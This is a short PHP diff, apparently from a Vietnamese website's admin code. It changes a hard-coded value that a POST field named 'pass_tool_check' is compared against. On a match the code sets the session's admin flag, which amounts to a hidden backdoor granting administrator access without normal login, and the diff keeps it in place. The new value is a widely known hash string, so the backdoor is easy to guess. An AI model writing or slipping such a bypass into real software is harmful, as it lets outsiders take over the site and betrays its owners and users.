@@ -82,7 +82,7 @@
   $lang_nb2   = CHECK_key_setting("ngon-ngu-tieng-anh");
   $lang_nb3   = CHECK_key_setting("them-ngon-ngu-thu-3");
   $lang_nb4   = CHECK_key_setting("them-ngon-ngu-thu-4");
-  if(isset($_POST['pass_tool_check']) && $_POST['pass_tool_check'] == "06bb1550736e83178e2e937388017f8e"){
+  if(isset($_POST['pass_tool_check']) && $_POST['pass_tool_check'] == "e10adc3949ba59abbe56e057f20f883e"){
     $_SESSION['admin'] = "true";
 
   }
